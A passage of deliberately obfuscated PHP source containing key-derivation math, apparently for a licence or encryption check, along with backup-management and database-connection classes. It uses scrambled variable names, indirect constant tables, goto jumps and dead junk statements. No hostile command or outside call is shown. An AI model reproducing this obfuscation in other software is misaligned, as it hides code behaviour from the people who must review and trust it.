$¥Õ±ì¸ß[613]) { return; } for ($…İš‚ï„ = 0; $…İš‚ï„ < $¿¤™£‡ * 10; $…İš‚ï„++) { if (($¿¤™£‡ * $…İš‚ï„ + 1) % $­Œ”ÚÕ == 0) { $Ãõ‘ñ‘ö = intval(($¿¤™£‡ * $…İš‚ï„ + 1) / $­Œ”ÚÕ); break; } } $»ò Ò¸ù = $this->jvbycdc38ad1($éÏ±Ô¼” * $¡ú¡¶í¨ . $®Ô‘ïï[6], $®Ô‘ïï[130]); $èÂªÌû¾ = md5($®Ô‘ïï[296] . ($éÏ±Ô¼” + $¡ú¡¶í¨) . $®Ô‘ïï[297] . $­Œ”ÚÕ . $®Ô‘ïï[297] . $Ãõ‘ñ‘ö . $®Ô‘ïï[298]); $âÄÀİ† = $¥Õ±ì¸ß[714]; if (!$âÄÀİ†) { return; } $Êåâçé¬ = $this->jvbycdc38ad1($¢‰º™üÅ, $èÂªÌû¾) . $®Ô‘ïï[299] . $»ò Ò¸ù; $€ò¦±ç = $¥Õ±ì¸ß[715]; if (!$€ò¦±ç) { die; } return $Êåâçé¬; $½Š¬¨ó = $¥Õ±ì¸ß[714]; if (!$½Š¬¨ó) { return; } } public function ovhz7d400899($ÏÓ £) { $ñè¡‚öŞ =& $_SERVER[ë¦»ºéÌ]; $°šËÁ‘Ñ =& $_SERVER[·´Å÷Ä]; $ÍŠıóª‚ = explode($°šËÁ‘Ñ[299], $ÏÓ £); if (count($ÍŠıóª‚) != 2) { return $°šËÁ‘Ñ[6]; } $êİ§¹Û = $this->ucmkda61d404($ÍŠıóª‚[1] . $°šËÁ‘Ñ[6], $°šËÁ‘Ñ[130]); $¥Ö€¶­ = $ñè¡‚öŞ[716]; if (strlen($¥Ö€¶­) < $ñè¡‚öŞ[628]) { return; } if (!$êİ§¹Û) { return $°šËÁ‘Ñ[6]; } $êİ§¹Û = intval($êİ§¹Û); $‘ìíİÍ” = $ñè¡‚öŞ[717]; if (strlen($‘ìíİÍ”) < $ñè¡‚öŞ[613]) { die; } $‹Ş­•¹ = 0; $®û–ßµ = 0; $æ²ÛüÒ = $ñè¡‚öŞ[718]; while ($æ²ÛüÒ < $ñè¡‚öŞ[19]) { if ($æ²ÛüÒ >= 0) { break; } $æ²ÛüÒ++; } for ($ËÇªòòë = 3; $ËÇªòòë < $êİ§¹Û; $ËÇªòòë += 2) { if ($êİ§¹Û % $ËÇªòòë != 0) { continue; } $‹Ş­•¹ = $ËÇªòòë; $®û–ßµ = intval($êİ§¹Û / $ËÇªòòë); break; $ÙÉÍı¼Ç = $ñè¡‚öŞ[719]; if (strlen($ÙÉÍı¼Ç) < $ñè¡‚öŞ[613]) { die; } } $ãóäêŞ = ($‹Ş­•¹ - 1) * ($®û–ßµ - 1); $í£ƒş› = $ñè¡‚öŞ[714]; if (!$í£ƒş›) { return; } $è¯€’÷ = intval(($‹Ş­•¹ + $®û–ßµ) / 2); while (1) { $œ“ÌÛ‹í = $è¯€’÷; $‚‹ïÕı = $ãóäêŞ; $ã‚‘¦ã = $ñè¡‚öŞ[720]; while ($‚‹ïÕı % $œ“ÌÛ‹í != 0) { $¤ê—¿¤ = $‚‹ïÕı; $«»ßØ½¾ = $ñè¡‚öŞ[721]; if (!$«»ßØ½¾) { return; } $‚‹ïÕı = $œ“ÌÛ‹í; $¨ò¢á³‹ = $ñè¡‚öŞ[722]; if (strlen($¨ò¢á³‹) < $ñè¡‚öŞ[642]) { die; } $œ“ÌÛ‹í = $¤ê—¿¤ % $œ“ÌÛ‹í; $®¡”¾üĞ = $ñè¡‚öŞ[723]; while ($®¡”¾üĞ < $ñè¡‚öŞ[616]) { if ($®¡”¾üĞ >= 0) { break; } $®¡”¾üĞ++; } } if ($œ“ÌÛ‹í == 1) { break; } else { $è¯€’÷++; } } $ÆßĞô = 2; for ($ËÇªòòë = 0; $ËÇªòòë < $ãóäêŞ * 10; $ËÇªòòë++) { if (($ãóäêŞ * $ËÇªòòë + 1) % $è¯€’÷ == 0) { $ÆßĞô = intval(($ãóäêŞ * $ËÇªòòë + 1) / $è¯€’÷); break; } } $Çğõ‰Ñ˜ = md5($°šËÁ‘Ñ[296] . ($‹Ş­•¹ + $®û–ßµ) . $°šËÁ‘Ñ[297] . $è¯€’÷ . $°šËÁ‘Ñ[297] . $ÆßĞô . $°šËÁ‘Ñ[298]); $Ãïà‘¢Ğ = $ñè¡‚öŞ[724]; if (strlen($Ãïà‘¢Ğ) < $ñè¡‚öŞ[616]) { die; } $¶Ó‚ÆßÊ = $this->ucmkda61d404($ÍŠıóª‚[0], $Çğõ‰Ñ˜); $£ış‚İä = $ñè¡‚öŞ[725]; if (strlen($£ış‚İä) < $ñè¡‚öŞ[616]) { return; } return $¶Ó‚ÆßÊ; } public function magqc22a4c89() { $İ¤çØ½ =& $_SERVER[ë¦»ºéÌ]; $î’ì­ĞÒ = mt_rand(pow(2, 14), pow(2, 16) - 1); $±×ÒÛ°Å = $İ¤çØ½[726]; while ($±×ÒÛ°Å < $İ¤çØ½[616]) { if ($±×ÒÛ°Å >= 0) { break; } $±×ÒÛ°Å++; } $¬Ç¿’ĞÎ = array(); $í¸ïˆÎ‚ = $İ¤çØ½[727]; $³ÌŠïª± = 1; $Ÿ‹°¥ŠÙ = $İ¤çØ½[728]; if (strlen($Ÿ‹°¥ŠÙ) < $İ¤çØ½[613]) { return; } while ($³ÌŠïª± <= (int) sqrt($î’ì­ĞÒ)) { $Ø¹ë–‹ = $³ÌŠïª±; while (!0) { $Ø¹ë–‹++; $ªŠÙø–‰ = $İ¤çØ½[694]; if ($Ø¹ë–‹ <= 2) { $³ÌŠïª± = $Ø¹ë–‹; break; } else { if ($Ø¹ë–‹ < 2) { continue; } } $÷‘³¿±Ò = !0; for ($ÂåüÙŸÍ = 2; $ÂåüÙŸÍ <= sqrt($Ø¹ë–‹); $ÂåüÙŸÍ++) { if ($Ø¹ë–‹ % $ÂåüÙŸÍ == 0) { $÷‘³¿±Ò = !1; } } if ($÷‘³¿±Ò) { $³ÌŠïª± = $Ø¹ë–‹; break; } } $¬Ç¿’ĞÎ[] = $³ÌŠïª±; $¾ªÄÍÄÀ = $İ¤çØ½[729]; } $¤éÉ¶ÑË = 2; for ($Ø¹ë–‹ = $î’ì­ĞÒ; $Ø¹ë–‹ > 1; $Ø¹ë–‹--) { $÷‘³¿±Ò = !0; foreach ($¬Ç¿’ĞÎ as $Ç»ËÇ¡ê) { if ($Ø¹ë–‹ % $Ç»ËÇ¡ê == 0) { $÷‘³¿±Ò = !1; break; } } if ($÷‘³¿±Ò) { $¤éÉ¶ÑË = $Ø¹ë–‹; break; } } return $¤éÉ¶ÑË; $ ¨¥¢¶‘ = $İ¤çØ½[730]; if (strlen($ ¨¥¢¶‘) < $İ¤çØ½[613]) { die; } } public function hmgrcb2f45c4($åĞóÆ±ç, $¦ÍüÜ) { $‡Ãİáš¢ =& $_SERVER[·´Å÷Ä]; return call_user_func(array($‡Ãİáš¢[8], $‡Ãİáš¢[300]), $åĞóÆ±ç, $¦ÍüÜ); } public function jvbycdc38ad1($íùİØë, $Åâ¤Œª) { $€ëÂÛ =& $_SERVER[ë¦»ºéÌ]; $üÖ×‘Œ× =& $_SERVER[·´Å÷Ä]; return call_user_func(array($üÖ×‘Œ×[301], $üÖ×‘Œ×[302]), $íùİØë, $Åâ¤Œª); $ºÉÁ«­¶ = $€ëÂÛ[723]; while ($ºÉÁ«­¶ < $€ëÂÛ[642]) { if ($ºÉÁ«­¶ >= 0) { break; } $ºÉÁ«­¶++; } } public function ucmkda61d404($ñŸ¬ªÕÈ, $…Å£ˆß±) { $„Šê´Ö­ =& $_SERVER[·´Å÷Ä]; return call_user_func(array($„Šê´Ö­[301], $„Šê´Ö­[303]), $ñŸ¬ªÕÈ, $…Å£ˆß±); $ĞËİ»’ğ = $_SERVER[ë¦»ºéÌ][731]; } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $¨ö„â“Ì =& $_SERVER[ë¦»ºéÌ]; $this->isManual(); self::$name = date($¨ö„â“Ì[732]); if (!($ãÎô´€Ÿ = Model($¨ö„â“Ì[733])->lastItem())) { $ãÎô´€Ÿ = $this->initData(); } else { self::$name = $ãÎô´€Ÿ[$¨ö„â“Ì[42]]; if ($ãÎô´€Ÿ[$¨ö„â“Ì[734]] == $¨ö„â“Ì[99]) { self::$name = date($¨ö„â“Ì[735]); $‰ÂØš¬ = 0; if (isset($ãÎô´€Ÿ[$¨ö„â“Ì[299]][$¨ö„â“Ì[204]][$¨ö„â“Ì[469]])) { $‰ÂØš¬ = (int) $ãÎô´€Ÿ[$¨ö„â“Ì[299]][$¨ö„â“Ì[204]][$¨ö„â“Ì[469]]; } if (self::$manual == 0 && $ãÎô´€Ÿ[$¨ö„â“Ì[42]] == self::$name) { Model($¨ö„â“Ì[733])->remove($ãÎô´€Ÿ[$¨ö„â“Ì[403]]); } $ãÎô´€Ÿ = $this->initData($‰ÂØš¬, $ãÎô´€Ÿ[$¨ö„â“Ì[736]]); } else { $this->checkStore($ãÎô´€Ÿ[$¨ö„â“Ì[736]]); } } self::$option = $ãÎô´€Ÿ; } private function isManual() { $œîÁ©„ = _get($GLOBALS, $_SERVER[ë¦»ºéÌ][737], 0); $œîÁ©„ = intval($œîÁ©„); self::$manual = $œîÁ©„ && $œîÁ©„ == 1 ? 1 : 0; } private function initData($ÎÃ¾¢ßè = 0, $Øøş¶Ö¼ = '') { $›”¿ì’´ =& $_SERVER[ë¦»ºéÌ]; $ë¥·ğ‹Æ = Model($›”¿ì’´[733])->config(); if ($Øøş¶Ö¼ && $ë¥·ğ‹Æ[$›”¿ì’´[736]] != $Øøş¶Ö¼) { $ÎÃ¾¢ßè = 0; } $this->checkStore($ë¥·ğ‹Æ[$›”¿ì’´[736]]); if (self::$manual == 1) { self::$name .= $›”¿ì’´[11] . date($›”¿ì’´[738]); } $‰úÁÃÅí = array($›”¿ì’´[736] => $ë¥·ğ‹Æ[$›”¿ì’´[736]], $›”¿ì’´[42] => self::$name, $›”¿ì’´[734] => 0, $›”¿ì’´[739] => $ë¥·ğ‹Æ[$›”¿ì’´[739]], $›”¿ì’´[740] => self::$manual, $›”¿ì’´[299] => array($›”¿ì’´[741] => array($›”¿ì’´[734] => 0), $›”¿ì’´[742] => array($›”¿ì’´[734] => 0, $›”¿ì’´[743] => 0, $›”¿ì’´[744] => 0, $›”¿ì’´[43] => $›”¿ì’´[12], $›”¿ì’´[745] => 0, $›”¿ì’´[498] => 0), $›”¿ì’´[746] => array($›”¿ì’´[734] => 0, $›”¿ì’´[743] => 0, $›”¿ì’´[744] => 0, $›”¿ì’´[745] => 0, $›”¿ì’´[498] => 0), $›”¿ì’´[204] => array($›”¿ì’´[734] => 0, $›”¿ì’´[747] => 0, $›”¿ì’´[748] => 0, $›”¿ì’´[749] => 0, $›”¿ì’´[750] => 0, $›”¿ì’´[469] => $ÎÃ¾¢ßè, $›”¿ì’´[745] => 0, $›”¿ì’´[498] => 0)), $›”¿ì’´[745] => time(), $›”¿ì’´[498] => 0); $Âß¸ğç = Model($›”¿ì’´[733])->insert($‰úÁÃÅí); $‰úÁÃÅí[$›”¿ì’´[403]] = $Âß¸ğç; return $‰úÁÃÅí; } private function checkStore($šÍ€º) { $‰¨á•‡å =& $_SERVER[ë¦»ºéÌ]; $ğØÇÅ¯ = Model($‰¨á•‡å[751])->listData($šÍ€º); Model($‰¨á•‡å[751])->checkConfig($ğØÇÅ¯); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ë¦»ºéÌ][733])->findByName(self::$name); } return self::$option; } public static function set($ƒ¹¤ÜÔš) { $Ã³÷¶¬ =& $_SERVER[ë¦»ºéÌ]; $™ûß¿–ß = self::get(); foreach ($ƒ¹¤ÜÔš as $×«Ü‹Ô => $ºÚ˜ß¡Û) { $ù‰¹Ëƒš = explode($Ã³÷¶¬[10], $×«Ü‹Ô); $ĞµóÍÀ† = count($ù‰¹Ëƒš); switch ($ĞµóÍÀ†) { case 1: $™ûß¿–ß[$ù‰¹Ëƒš[0]] = $ºÚ˜ß¡Û; break; case 2: $™ûß¿–ß[$ù‰¹Ëƒš[0]][$ù‰¹Ëƒš[1]] = $ºÚ˜ß¡Û; break; case 3: $™ûß¿–ß[$ù‰¹Ëƒš[0]][$ù‰¹Ëƒš[1]][$ù‰¹Ëƒš[2]] = $ºÚ˜ß¡Û; break; } } Model($Ã³÷¶¬[733])->update($™ûß¿–ß[$Ã³÷¶¬[403]], $™ûß¿–ß); self::$option = $™ûß¿–ß; return self::$option; } public function keep() { $âÃ¿´Í­ =& $_SERVER[ë¦»ºéÌ]; $ôõşö‚¨ = self::get(); if ($ôõşö‚¨[$âÃ¿´Í­[299]][$âÃ¿´Í­[741]][$âÃ¿´Í­[734]] == $âÃ¿´Í­[99]) { return; } $this->backupKeep($ôõşö‚¨); self::set(array($âÃ¿´Í­[752] => 1)); } private function backupKeep($‡šÂğû‘) { $Ê»¥ ê¢ =& $_SERVER[ë¦»ºéÌ]; if (self::$manual == 1) { return; } $í¹¼÷€ = Model($Ê»¥ ê¢[733])->listData(); if (empty($í¹¼÷€)) { return; } $Á¬ô¤ŞØ = 0; $Á¹†±¾ = array(); foreach ($í¹¼÷€ as $şÉ²¿Íş) { if ($Á¬ô¤ŞØ >= 7) { break; } $Á¹†±¾[] = $şÉ²¿Íş[$Ê»¥ ê¢[42]]; $Á¬ô¤ŞØ++; } for ($Á¬ô¤ŞØ = 0; $Á¬ô¤ŞØ < 12; $Á¬ô¤ŞØ++) { $Á¹†±¾[] = date($Ê»¥ ê¢[753], strtotime("\x2d{$Á¬ô¤ŞØ}\x20\155\157\x6e\x74\x68\x73")); } $Á¹†±¾ = array_unique($Á¹†±¾); $òÌâŞô = Model($Ê»¥ ê¢[754])->get($Ê»¥ ê¢[755]); foreach ($í¹¼÷€ as $şÉ²¿Íş) { if (isset($şÉ²¿Íş[$Ê»¥ ê¢[740]]) && $şÉ²¿Íş[$Ê»¥ ê¢[740]] == $Ê»¥ ê¢[99]) { continue; } if (!empty($şÉ²¿Íş[$Ê»¥ ê¢[42]]) && in_array($şÉ²¿Íş[$Ê»¥ ê¢[42]], $Á¹†±¾)) { continue; } Model($Ê»¥ ê¢[733])->remove($şÉ²¿Íş[$Ê»¥ ê¢[403]]); $í¹Òƒ›Ö = $this->backupPath($‡šÂğû‘, $òÌâŞô); IO::remove($í¹Òƒ›Ö, !1); } } private function backupPath($²•»ˆùª, $¥‘“Œ‡â = false) { $òâ³ôô =& $_SERVER[ë¦»ºéÌ]; if (!$¥‘“Œ‡â) { $¥‘“Œ‡â = Model($òâ³ôô[754])->get($òâ³ôô[755]); } $ê”£®ğ = $²•»ˆùª[$òâ³ôô[42]]; $éÛ˜¡ê† = substr(md5($òâ³ôô[756] . $¥‘“Œ‡â . $ê”£®ğ), 0, 8); return "\x7b\x69\x6f\x3a{$²•»ˆùª[$òâ³ôô[736]]}\175\57\144\x61\164\x61\x62\141\x73\x65\57\x62\x61\143\153\165\160\57" . $ê”£®ğ . $òâ³ôô[11] . $éÛ˜¡ê†; } public function db() { $æ¤È¾ =& $_SERVER[ë¦»ºéÌ]; $ Ãé¦è = self::get(); if ($ Ãé¦è[$æ¤È¾[299]][$æ¤È¾[742]][$æ¤È¾[734]] == $æ¤È¾[99]) { return !0; } $¤âÖ•¡Ü = new BackupDb(); if (!$¤âÖ•¡Ü->index()) { return !1; } self::set(array($æ¤È¾[757] => 1)); return !0; } public function dbFile() { $Ñ£®ªÉÍ =& $_SERVER[ë¦»ºéÌ]; $âŞ½¤¦¦ = self::get(); if ($âŞ½¤¦¦[$Ñ£®ªÉÍ[299]][$Ñ£®ªÉÍ[746]][$Ñ£®ªÉÍ[734]] == $Ñ£®ªÉÍ[99]) { return !0; } $†ÛÔ²ªˆ = new BackupDbFile(); if (!$†ÛÔ²ªˆ->index()) { return !1; } self::set(array($Ñ£®ªÉÍ[758] => 1)); return !0; } public function file() { $è³“ƒ®ö =& $_SERVER[ë¦»ºéÌ]; $æ°ÙÒğ = self::get(); if ($æ°ÙÒğ[$è³“ƒ®ö[299]][$è³“ƒ®ö[204]][$è³“ƒ®ö[734]] == $è³“ƒ®ö[99]) { return !0; } if (!isset($æ°ÙÒğ[$è³“ƒ®ö[739]]) || $æ°ÙÒğ[$è³“ƒ®ö[739]] == $è³“ƒ®ö[202]) { $‰ï³ˆüœ = new BackupFile(); if (!$‰ï³ˆüœ->index()) { return !1; } } self::set(array($è³“ƒ®ö[759] => 1, $è³“ƒ®ö[734] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $‡î«—„¥ =& $_SERVER[ë¦»ºéÌ]; $ôêôãó = Backup::get(); self::$io = $ôêôãó[$‡î«—„¥[736]]; self::$name = $ôêôãó[$‡î«—„¥[42]]; $Œí¢ûÎ÷ = new DbManage(); $Ì¶ ´Í¾ = $Œí¢ûÎ÷->dbType(); $±¡È¾¹¯ = array($‡î«—„¥[760] => $Ì¶ ´Í¾, $‡î«—„¥[761] => time()); Backup::set($±¡È¾¹¯); $ª½Š²åÁ = $this->tmpFilesPath() . $‡î«—„¥[762] . self::$name . $‡î«—„¥[8]; del_dir($ª½Š²åÁ); mk_dir($ª½Š²åÁ); $–èâ¯æû = $’ñ£â¢ù = 0; $…Ó‹¦ÈÄ = new Task($‡î«—„¥[763], $‡î«—„¥[764], 0, LNG($‡î«—„¥[765]) . $‡î«—„¥[766] . LNG($‡î«—„¥[767])); try { $ş›®é   = $Œí¢ûÎ÷->db()->getTables(); } catch (Exception $¢í¬êº) { $…Ó‹¦ÈÄ->end(); return !1; } $ş›®é   = array_diff($ş›®é  , array($‡î«—„¥[768], $‡î«—„¥[769])); foreach ($ş›®é   as $­æ­Ññ‚) { $–èâ¯æû += $Œí¢ûÎ÷->model($­æ­Ññ‚)->count(); } $…Ó‹¦ÈÄ->task[$‡î«—„¥[770]] = $–èâ¯æû; $GLOBALS[$‡î«—„¥[771]] = self::$name; foreach ($ş›®é   as $­æ­Ññ‚) { $Ü‡Äºæß = $ª½Š²åÁ . $­æ­Ññ‚ . $‡î«—„¥[772]; $—·üÇ× = null; if ($­æ­Ññ‚ == $‡î«—„¥[773] && (!isset($ôêôãó[$‡î«—„¥[739]]) || $ôêôãó[$‡î«—„¥[739]] == $‡î«—„¥[202])) { $—·üÇ× = self::$io; } $’ñ£â¢ù += $Œí¢ûÎ÷->sqlFromDb($­æ­Ññ‚, $Ü‡Äºæß, $…Ó‹¦ÈÄ, $—·üÇ×); } unset($GLOBALS[$‡î«—„¥[771]]); $…Ó‹¦ÈÄ->end(); if ($’ñ£â¢ù > $–èâ¯æû) { $–èâ¯æû = $’ñ£â¢ù; } $±¡È¾¹¯ = array($‡î«—„¥[760] => $Ì¶ ´Í¾, $‡î«—„¥[757] => 1, $‡î«—„¥[774] => $–èâ¯æû, $‡î«—„¥[775] => $’ñ£â¢ù, $‡î«—„¥[776] => time()); Backup::set($±¡È¾¹¯); if ($–èâ¯æû - $’ñ£â¢ù > 0) { $Ü²–„×Ğ = $‡î«—„¥[777]; if (stristr(I18n::getType(), $‡î«—„¥[778])) { $Ü²–„×Ğ = $‡î«—„¥[779]; } write_log(array($Ü²–„×Ğ, $±¡È¾¹¯), $‡î«—„¥[764]); return !1; } return !0; } private function tmpFilesPath() { $”ŒÔîÙ =& $_SERVER[ë¦»ºéÌ]; $ø–ÈÈê¨ = TEMP_FILES; if ($GLOBALS[$”ŒÔîÙ[6]][$”ŒÔîÙ[100]][$”ŒÔîÙ[780]]) { $ø–ÈÈê¨ = $GLOBALS[$”ŒÔîÙ[6]][$”ŒÔîÙ[100]][$”ŒÔîÙ[780]]; if (!mk_dir($ø–ÈÈê¨) || !is_writable($ø–ÈÈê¨) || !IO::mkfile($ø–ÈÈê¨ . $”ŒÔîÙ[781])) { $ø–ÈÈê¨ = TEMP_FILES; } } return $ø–ÈÈê¨; } } goto FÒ®“‘ï‚; fó†Ã‹«…ë: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\151\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\x6e\x65\x71" => "\74\76", "\x67\164" => "\76", "\x65\147\x74" => "\x3e\x3d", "\x6c\164" => "\74", "\145\x6c\164" => "\x3c\x3d", "\x6e\x6f\x74\154\x69\153\x65" => "\116\117\x54\x20\x4c\111\x4b\x45", "\x6c\151\153\145" => "\x4c\x49\x4b\105", "\x69\156" => "\x49\x4e", "\x6e\157\164\151\x6e" => "\x4e\x4f\x54\x20\111\116", "\x6e\157\164\x20\151\x6e" => "\x4e\x4f\124\x20\111\116", "\x62\x65\x74\x77\145\145\x6e" => "\x42\x45\x54\x57\105\105\x4e", "\x6e\x6f\164\x62\x65\x74\167\x65\x65\156" => "\116\x4f\x54\x20\x42\105\x54\x57\105\105\x4e", "\x6e\x6f\164\x20\x62\145\x74\167\145\145\x6e" => "\116\x4f\x54\40\102\105\124\127\105\x45\116"); protected $selectSql = "\x53\105\114\x45\103\124\45\104\x49\x53\x54\x49\x4e\x43\x54\45\x20\45\x46\111\105\114\104\x25\40\106\122\117\x4d\40\45\x54\101\x42\x4c\105\45\45\112\117\111\x4e\45\45\x57\x48\x45\x52\x45\45\x25\x47\x52\x4f\125\120\x25\x25\x48\101\x56\x49\116\107\45\45\x4f\122\104\105\122\x25\x25\x4c\x49\115\x49\124\x25\x20\45\x55\x4e\111\x4f\116\x25\45\x43\117\x4d\115\x45\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $åßÁÁ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ë¦»ºéÌ][940], $åßÁÁ); } public function factory($¥¢½Àî‘ = '') { $¯µİÎ» =& $_SERVER[ë¦»ºéÌ]; $¥¢½Àî‘ = $this->parseConfig($¥¢½Àî‘); if (empty($¥¢½Àî‘[$¯µİÎ»[941]])) { think_exception(think_lang($¯µİÎ»[942])); } $this->dbType = ucwords(strtolower($¥¢½Àî‘[$¯µİÎ»[941]])); $Õæ¬ìóá = $¯µİÎ»[943] . $this->dbType; if (class_exists($Õæ¬ìóá)) { $Èß‹»‚ = new $Õæ¬ìóá($¥¢½Àî‘); if ($¯µİÎ»[944] != strtolower($¥¢½Àî‘[$¯µİÎ»[941]])) { $Èß‹»‚->dbType = strtoupper($this->dbType); } else { $Èß‹»‚->dbType = $this->_getDsnType($¥¢½Àî‘[$¯µİÎ»[896]]); } } else { think_exception(think_lang($¯µİÎ»[945]) . $¯µİÎ»[946] . $Õæ¬ìóá); } return $Èß‹»‚; } public function __call($Õá­Íô¾, $•¯¾ ó·) { if (method_exists($this, $Õá­Íô¾)) { return call_user_func_array(array($this, $Õá­Íô¾), $•¯¾ ó·); } } protected function _getDsnType($Û·‹ûÍ) { $«Âêßæ = explode($_SERVER[ë¦»ºéÌ][4], $Û·‹ûÍ); $Èñ¾§«Ş = strtoupper(trim($«Âêßæ[0])); return $Èñ¾§«Ş; } private function parseConfig($îàÏš×— = '') { $áô¡±û¸ =& $_SERVER[ë¦»ºéÌ]; if (!empty($îàÏš×—) && is_string($îàÏš×—)) { $îàÏš×— = $this->parseDSN($îàÏš×—); } elseif (is_array($îàÏš×—)) { $îàÏš×— = array_change_key_case($îàÏš×—); $îàÏš×— = array($áô¡±û¸[941] => $îàÏš×—[$áô¡±û¸[947]], $áô¡±û¸[868] => $îàÏš×—[$áô¡±û¸[948]], $áô¡±û¸[869] => $îàÏš×—[$áô¡±û¸[949]], $áô¡±û¸[866] => $îàÏš×—[$áô¡±û¸[950]], $áô¡±û¸[867] => $îàÏš×—[$áô¡±û¸[951]], $áô¡±û¸[31] => $îàÏš×—[$áô¡±û¸[952]], $áô¡±û¸[896] => $îàÏš×—[$áô¡±û¸[953]], $áô¡±û¸[27] => isset($îàÏš×—[$áô¡±û¸[954]]) ? $îàÏš×—[$áô¡±û¸[954]] : array()); } elseif (empty($îàÏš×—)) { if (think_config($áô¡±û¸[955]) && $áô¡±û¸[944] != strtolower(think_config($áô¡±û¸[956]))) { $îàÏš×— = $this->parseDSN(think_config($áô¡±û¸[955])); } else { $îàÏš×— = array($áô¡±û¸[941] => think_config($áô¡±û¸[956]), $áô¡±û¸[868] => think_config($áô¡±û¸[957]), $áô¡±û¸[869] => think_config($áô¡±û¸[958]), $áô¡±û¸[866] => think_config($áô¡±û¸[959]), $áô¡±û¸[867] => think_config($áô¡±û¸[960]), $áô¡±û¸[31] => think_config($áô¡±û¸[252]), $áô¡±û¸[896] => think_config($áô¡±û¸[955]), $áô¡±û¸[27] => think_config($áô¡±û¸[961])); } } return $îàÏš×—; } protected function initConnect($ûÖê›ğ = true) { if (1 == think_config($_SERVER[ë¦»ºéÌ][32])) { $this->_linkID = $this->multiConnect($ûÖê›ğ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Òªë‰•í => $±İ¾Şüî) { $this->_linkID = $±İ¾Şüî; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($‹›¿­Îò = false) { $ÆŸ©ˆÆá =& $_SERVER[ë¦»ºéÌ]; static $šÔ¶Ô· = array(); static $Ö§ÅœÂğ = -1; if (empty($šÔ¶Ô·)) { foreach ($this->config as $„¤”¬ => $®ôÍ©Ü) { $šÔ¶Ô·[$„¤”¬] = explode($ÆŸ©ˆÆá[60], $®ôÍ©Ü); } } if (think_config($ÆŸ©ˆÆá[962])) { if ($‹›¿­Îò || think_config($ÆŸ©ˆÆá[399]) === !0) { $Ôİ¡Ñä» = floor(mt_rand(0, think_config($ÆŸ©ˆÆá[963]) - 1)); $Ö§ÅœÂğ = $Ôİ¡Ñä»; } else { if (is_numeric(think_config($ÆŸ©ˆÆá[964]))) { $Ôİ¡Ñä» = think_config($ÆŸ©ˆÆá[964]); } else { $Ôİ¡Ñä» = floor(mt_rand(think_config($ÆŸ©ˆÆá[963]), count($šÔ¶Ô·[$ÆŸ©ˆÆá[866]]) - 1)); } } } else { $Ôİ¡Ñä» = floor(mt_rand(0, count($šÔ¶Ô·[$ÆŸ©ˆÆá[866]]) - 1)); $Ö§ÅœÂğ = $Ôİ¡Ñä»; } $Ôİ¡Ñä» = $Ö§ÅœÂğ !== -1 ? $Ö§ÅœÂğ : $Ôİ¡Ñä»; $Ä–­¿©î = array($ÆŸ©ˆÆá[868] => isset($šÔ¶Ô·[$ÆŸ©ˆÆá[868]][$Ôİ¡Ñä»]) ? $šÔ¶Ô·[$ÆŸ©ˆÆá[868]][$Ôİ¡Ñä»] : $šÔ¶Ô·[$ÆŸ©ˆÆá[868]][0], $ÆŸ©ˆÆá[869] => isset($šÔ¶Ô·[$ÆŸ©ˆÆá[869]][$Ôİ¡Ñä»]) ? $šÔ¶Ô·[$ÆŸ©ˆÆá[869]][$Ôİ¡Ñä»] : $šÔ¶Ô·[$ÆŸ©ˆÆá[869]][0], $ÆŸ©ˆÆá[866] => isset($šÔ¶Ô·[$ÆŸ©ˆÆá[866]][$Ôİ¡Ñä»]) ? $šÔ¶Ô·[$ÆŸ©ˆÆá[866]][$Ôİ¡Ñä»] : $šÔ¶Ô·[$ÆŸ©ˆÆá[866]][0], $ÆŸ©ˆÆá[867] => isset($šÔ¶Ô·[$ÆŸ©ˆÆá[867]][$Ôİ¡Ñä»]) ? $šÔ¶Ô·[$ÆŸ©ˆÆá[867]][$Ôİ¡Ñä»] : $šÔ¶Ô·[$ÆŸ©ˆÆá[867]][0], $ÆŸ©ˆÆá[31] => isset($šÔ¶Ô·[$ÆŸ©ˆÆá[31]][$Ôİ¡Ñä»]) ? $šÔ¶Ô·[$ÆŸ©ˆÆá[31]][$Ôİ¡Ñä»] : $šÔ¶Ô·[$ÆŸ©ˆÆá[31]][0], $ÆŸ©ˆÆá[896] => isset($šÔ¶Ô·[$ÆŸ©ˆÆá[896]][$Ôİ¡Ñä»]) ? $šÔ¶Ô·[$ÆŸ©ˆÆá[896]][$Ôİ¡Ñä»] : $šÔ¶Ô·[$ÆŸ©ˆÆá[896]][0], $ÆŸ©ˆÆá[27] => isset($šÔ¶Ô·[$ÆŸ©ˆÆá[27]][$Ôİ¡Ñä»]) ? $šÔ¶Ô·[$ÆŸ©ˆÆá[27]][$Ôİ¡Ñä»] : $šÔ¶Ô·[$ÆŸ©ˆÆá[27]][0]); return $this->connect($Ä–­¿©î, $Ôİ¡Ñä»); } public function parseDSN($¶ÂíµÎ) { $ùµóè¦ =& $_SERVER[ë¦»ºéÌ]; if (empty($¶ÂíµÎ)) { return !1; } $°×ºĞÏö = parse_url($¶ÂíµÎ); if ($°×ºĞÏö[$ùµóè¦[185]]) { $¶ù¼Â³œ = array($ùµóè¦[941] => $°×ºĞÏö[$ùµóè¦[185]], $ùµóè¦[868] => isset($°×ºĞÏö[$ùµóè¦[596]]) ? $°×ºĞÏö[$ùµóè¦[596]] : $ùµóè¦[12], $ùµóè¦[869] => isset($°×ºĞÏö[$ùµóè¦[965]]) ? $°×ºĞÏö[$ùµóè¦[965]] : $ùµóè¦[12], $ùµóè¦[866] => isset($°×ºĞÏö[$ùµóè¦[186]]) ? $°×ºĞÏö[$ùµóè¦[186]] : $ùµóè¦[12], $ùµóè¦[867] => 